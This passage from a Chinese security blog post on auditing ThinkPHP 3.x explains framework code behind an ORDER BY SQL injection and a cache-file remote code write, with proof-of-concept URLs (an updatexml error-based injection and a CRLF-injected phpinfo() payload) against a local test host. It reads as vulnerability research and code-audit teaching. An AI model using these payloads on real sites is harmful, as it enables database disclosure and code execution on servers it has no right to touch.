<h3 id="场景构造-1"><a href="#场景构造-1" class="headerlink" title="场景构造"></a>场景构造</h3><p>构造一个order参数可控的场景，不过似乎很少有程序会把查询排序的参数交给用户</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$order</span> = I(<span class="hljs-string">&#x27;GET.order&#x27;</span>);<br>    <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>		<span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;order(<span class="hljs-variable">$order</span>)-&gt;find();<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://tp.test:<span class="hljs-number">8888</span>/home/index/test?order=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select%<span class="hljs-number">20</span>user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>实际执行sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<h3 id="系统修复"><a href="#系统修复" class="headerlink" title="系统修复"></a>系统修复</h3><p>在看系统修复代码时发现，ThinkPHP3.2.4主要采用了判断输入中是否有括号的方式过滤，在ThinkPHP3.2.5中则用正则表达式过滤特殊符号。另外该在 ThinkPHP&lt;=5.1.22 版本也存在这样的漏洞，利用方式有一些不同</p>
<p>在复现该漏洞时发现其他博主的代码和我的不一样，我这里以官网下载的代码为准</p>
<h2 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h2><p>ThinkPHP 中提供了一个数据缓存的功能，对应<strong>S方法</strong>快捷方法，可以先将一些数据保存在文件中，再次访问该数据时直接访问缓存文件即可</p>
<h3 id="缓存文件示例"><a href="#缓存文件示例" class="headerlink" title="缓存文件示例"></a>缓存文件示例</h3><p>按照缓存初始化时候的参数进行缓存数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>  	<span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>  	S(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-variable">$name</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>下次在读取该值时通过缓存文件可以更快获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cache</span>(<span class="hljs-params"></span>)</span>&#123;<br>  	<span class="hljs-variable">$value</span> = S(<span class="hljs-string">&#x27;name&#x27;</span>);<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>先访问test()，生成缓存数据</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp.test:<span class="hljs-number">8888</span><span class="hljs-regexp">/home/i</span>ndex/test?name=jelly<br></code></pre></td></tr></table></figure>

<p>发现生成文件：Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210729173556871.png" srcset="/img/loading.gif" lazyload alt="image-20210729173556871" style="zoom:50%;" />

<p>然后访问cache()，获取缓存数据</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210729173745860.png" srcset="/img/loading.gif" lazyload alt="image-20210729173745860" style="zoom:50%;" />

<p>上面就是缓存文件生成和使用的过程</p>
<h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>具体分析一下 S 方法的代码是怎么产生漏洞的：</p>
<blockquote>
<p>ThinkPHP/Common/functions.php</p>
</blockquote>
<p>S方法会实例化一个$cache对象，$cache对象具有查看缓存，删除缓存和写缓存的动能，这里我们只关注写缓存的 set() 方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">S</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$options</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>  	<span class="hljs-comment">// 	缓存初始化</span><br>  	<span class="hljs-variable">$cache</span> = Think\Cache::getInstance();<br>  	<span class="hljs-comment">//	具体缓存操作</span><br>  	<span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;&#x27;</span>=== <span class="hljs-variable">$value</span>)&#123; <span class="hljs-comment">// 获取缓存</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;get(<span class="hljs-variable">$name</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(is_null(<span class="hljs-variable">$value</span>)) &#123; <span class="hljs-comment">// 删除缓存</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;rm(<span class="hljs-variable">$name</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 缓存数据</span><br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$options</span>)) &#123;<br>            <span class="hljs-variable">$expire</span>     =   <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;expire&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;expire&#x27;</span>]:<span class="hljs-literal">NULL</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$expire</span>     =   is_numeric(<span class="hljs-variable">$options</span>)?<span class="hljs-variable">$options</span>:<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache</span>-&gt;set(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span>);<br>		&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ThinkPHP/Library/Think/Cache/Driver/File.class.php</p>
</blockquote>
<ul>
<li>先看 <code>file_put_contents()</code> ，就是这里写入了文件，我们需要控制其中的两个参数，文件名 <code>$filename</code>, 写入数据 <code>$data</code></li>
<li>文件名 <code>$filename</code>来自方法<code>filename($name)</code>，其中<code>$name</code>为S方法的外部参数，如果该参数可控，可能会导致文件名被控制，filename()是怎么操作的等下细看</li>
<li>写入数据 <code>$data</code> 来自<code>$value</code> 处理后的数据，<code>$value</code> 可控<ul>
<li><code>$value</code> 先经过序列化</li>
<li>然后使用 <code>&lt;?php\n//</code>, <code>?&gt;</code> 包裹 $value 序列化后的值，这是要写入一个php文件呀，危险！注意这里使用了行注释符<code>//</code>，保证写入的数据不会被解析，但是我们可以通过换行符等手段轻松绕过</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Cache</span> </span>&#123;<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span>,<span class="hljs-variable">$expire</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>        ……<br>        <span class="hljs-variable">$filename</span>   =   <span class="hljs-keyword">$this</span>-&gt;filename(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-variable">$data</span>   =   serialize(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-variable">$data</span>    = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span>.sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>,<span class="hljs-variable">$expire</span>).<span class="hljs-variable">$check</span>.<span class="hljs-variable">$data</span>.<span class="hljs-string">&quot;\n?&gt;&quot;</span>;<br>        <span class="hljs-variable">$result</span>  =   file_put_contents(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;length&#x27;</span>]&gt;<span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 记录缓存队列</span><br>                <span class="hljs-keyword">$this</span>-&gt;queue(<span class="hljs-variable">$name</span>);<br>            &#125;<br>            clearstatcache();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>下面关注一下文件的命名方式，具体方法为filename()</p>
<ul>
<li><code>C(&#39;DATA_CACHE_KEY&#39;)</code> 就是获取配置文件中 DATA_CACHE_KEY 的值，==该值默认为空。该值为空时，<code>$name</code> 最终的md5加密值也就清楚了==</li>
<li><code>$this-&gt;options[&#39;prefix&#39;]</code> 默认为空，最终的文件名则将由<code>$this-&gt;options[&#39;temp&#39;]</code> 决定</li>
<li><code>$this-&gt;options[&#39;temp&#39;]</code> 默认为 <code>Application/Runtime/Temp</code></li>
<li>所以在默认情况下，写入缓存的文件名应该为：<code>Application/Runtime/Temp/md5($name)</code>，<code>$name</code>为S方法外部参数</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filename</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>    <span class="hljs-variable">$name</span>	=	md5(C(<span class="hljs-string">&#x27;DATA_CACHE_KEY&#x27;</span>).<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">if</span>(C(<span class="hljs-string">&#x27;DATA_CACHE_SUBDIR&#x27;</span>)) &#123;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$filename</span>	=	<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>].<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;temp&#x27;</span>].<span class="hljs-variable">$filename</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//tp.test:8888/home/index/test?name=%0d%0aphpinfo();%0d%0a//</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>0x0d - \r, carrige return    回车</p>
<p>0x0a - \n, new line            换行</p>
<p>Windows 中换行为0d 0a，UNIX 换行为 0a</p>
</blockquote>
<p>参数名 name 决定泄露缓存文件名，md5(name)=b068931cc450442b63f5b3d276ea4297，文件名则为：b068931cc450442b63f5b3d276ea4297.php，默认目录为Application/Runtime/Temp，然后访问我们的php文件</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210729185856826.png" srcset="/img/loading.gif" lazyload alt="image-20210729185856826" style="zoom:50%;" />

<h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>利用该漏洞需要文件名完全可控，所以得知道程序定义DATA_CACHE_KEY和options[‘prefix’]，好在这两个参数默认为空。不过利用该漏洞需要知道程序在哪里使用了S方法，且S方法的参数可控，所以该漏洞基本只能通过代码审计找出，如果有了程序的源代码，那么文件名就更不是问题了</p>
<p>另外需要注意的是该漏洞被利用的另外一个原因 TP3 不安全的 web 目录部署，导致生成的缓存文件是可以直接访问的，在 TP5 一些版本中也有这个漏洞，但是 TP5 的 web 目录部署更加安全，这个漏洞并一定能利用</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文主要总结了在审计 TP3 框架的代码时应该注意的点，在 TP3 框架基础知识上应该知道路由处理，快捷方法，模型的运作等，在漏洞审计方面应该知道哪些不规范的写法可能会造成漏洞，另外通过复现 TP3 历史漏洞知道，即使是规范的写法也是可能存在漏洞的。</p>
<p>本文篇幅较大，为了方便日后审计 TP 3的代码，这里简单总结下 TP3 的漏洞审计，至于没有提到的点，通过正常的代码审计方法也能正常审计 TP3 的代码，该部分根据日后的经验持续完善</p>
<h2 id="sql注入漏洞总结"><a href="#sql注入漏洞总结" class="headerlink" title="sql注入漏洞总结"></a>sql注入漏洞总结</h2><p>以下面的sql语句为例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> AAA <span class="hljs-keyword">FROM</span> `BBB` <span class="hljs-keyword">WHERE</span> `CCC`<span class="hljs-operator">=</span><span class="hljs-string">&#x27;DDD&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> EEE LIMI <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>其中’xxx’的字符都有可能通过外部数据可控，在 TP3 中各字段由以下方法控制</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>方法</th>
</tr>
</thead>
<tbody><tr>
<td>AAA</td>
<td>field()</td>
</tr>
<tr>
<td>BBB</td>
<td>table()</td>
</tr>
<tr>
<td>CCC</td>
<td>where()</td>
</tr>
<tr>
<td>DDD</td>
<td>where()</td>
</tr>
<tr>
<td>EEE</td>
<td>order()</td>
</tr>
</tbody></table>
<p>在代码审计时主要关注该版本是否存在漏洞，这些方法的写法是否规范</p>
<p>1）没有按官方要求传入参数</p>
<p>使用双引号解析参数基本都会绕过tp的过滤，下面发现where()就有这样的情况，其他方法应该也有，在这种情况下即使使用了I方法也没有用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>)-&gt;select();<br></code></pre></td></tr></table></figure>

<p>2）没有使用 <strong>I方法</strong> 接收外部参数</p>
<p>虽然sql过滤不是在I方法中，但如果没有使用I方法接收参数，可能会让数据绕过底层的过滤。</p>
<p>如下没有使用I方法，通过注入bind的数组值会进入tp3处理bind数据的逻辑，从而绕过过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure>

<p>3）tp3存在sql注入漏洞</p>
<p>利用现有漏洞，即使程序使用了规范的写法也有可能存在漏洞。该点需要注意TP3的版本，在TP3.2.3及以前的版本基本存在漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// save() 注入漏洞</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;jop&#x27;</span>] = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;save(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">// delete(),find(),selsect() 注入漏洞</span><br><span class="hljs-variable">$id</span> = I(<span class="hljs-string">&#x27;GET.id&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;find(<span class="hljs-variable">$id</span>);<br><span class="hljs-comment">// order 注入漏洞</span><br><span class="hljs-variable">$order</span> = I(<span class="hljs-string">&#x27;GET.order&#x27;</span>);<br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;order(<span class="hljs-variable">$order</span>)-&gt;find();<br></code></pre></td></tr></table></figure>





<p>参考：</p>
<p>ThinkPHP3.2.3完全开发教程：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/">https://www.kancloud.cn/manual/thinkphp/</a></p>
<p>Thinkphp3 漏洞总结：<a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p>
<p>Thinkphp3个版本数据库操作以及底层代码分析：<a target="_blank" rel="noopener" href="https://hu3sky.github.io/">https://hu3sky.github.io</a></p>
<p>Thinkphp v3.2.3 select&amp;find&amp;delete 注入漏洞：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2629">https://xz.aliyun.com/t/2629</a></p>
<p>Thinkphp v3.2.3 update注入漏洞：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p>
<p>ThinkPhp3.2.3缓存漏洞复现以及修复建议：<a target="_blank" rel="noopener" href="https://www.pianshen.com/article/4312352780/">https://www.pianshen.com/article/4312352780/</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                      <a class="hover-with-bg" href="/tags/ThinkPHP/">ThinkPHP</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/09/seacms/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">通过 SeaCMS 学习 php 代码审计</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/09/blue/">
                        <span class="hidden-mobile">通过 BlueCMS 学习 php 代码审计</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"KoUUnhC8sqDPadKwA0C4f83s-gzGzoHsz","appKey":"FLKClsTKX9X9TPMSO1z9FK1T","placeholder":"说点什么","path":"window.location.pathname","avatar":"robohash","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
